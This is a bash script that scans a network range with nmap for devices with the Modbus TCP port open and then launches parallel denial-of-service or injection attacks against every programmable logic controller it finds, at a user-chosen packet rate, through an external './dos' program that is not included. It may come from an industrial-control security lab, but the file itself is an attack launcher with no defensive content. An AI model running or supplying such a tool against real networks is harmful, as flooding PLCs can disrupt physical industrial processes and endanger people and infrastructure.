#!/bin/bash

# Function to handle the termination signal (Ctrl+C)
cleanup() {
    echo "Stopping all attacks..."
    # Kill all background jobs
    kill $(jobs -p) 2>/dev/null
    wait
    echo "All attacks have been stopped."
    exit 0
}

# Set trap to call cleanup function on SIGINT (Ctrl+C)
trap cleanup SIGINT

# Display help information
show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo "Launch distributed Modbus injection attacks across a network."
    echo ""
    echo "Required options:"
    echo "  -n, --network NETWORK    Network address in CIDR notation (e.g., 192.168.60.0/24)"
    echo "  -f, --frequency FREQ     Attack frequency in packets per second"
    echo ""
    echo "Optional options:"
    echo "  -p, --port PORT          Modbus TCP port (default: 502)"
    echo "  -h, --help               Show this help message"
    echo ""
    echo "Example:"
    echo "  $0 -n 192.168.60.0/24 -f 20"
    echo "  $0 --network 192.168.1.0/24 --frequency 30 --port 5020"
    exit 0
}

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -n|--network) network_address="$2"; shift ;;
        -f|--frequency) attack_frequency="$2"; shift ;;
        -p|--port) port="$2"; shift ;;
        -h|--help) show_help ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

# Validate required parameters
if [[ -z "$network_address" || -z "$attack_frequency" ]]; then
    echo "Error: Missing required parameters!"
    show_help
fi

# Set default values for optional parameters
port=${port:-502}

# Extract network prefix from network address
network_prefix=$(echo "$network_address" | cut -d'.' -f1-3)

# Find Modbus PLC IP addresses
echo "Scanning network for Modbus devices on port $port..."
plc_ips=$(nmap -p $port --open "$network_address" | grep -oP "$network_prefix\.\d+")

if [[ -z "$plc_ips" ]]; then
    echo "No Modbus devices found on port $port in network $network_address"
    exit 1
fi

# Launch attacks in parallel
echo "Starting attacks on ${#plc_ips[@]} devices with $attack_frequency packets/sec..."
for ip in $plc_ips; do
    echo "Launching attack on PLC at $ip"
    ./dos -h "$ip" -f "$attack_frequency" &
done

# Wait for all background processes
wait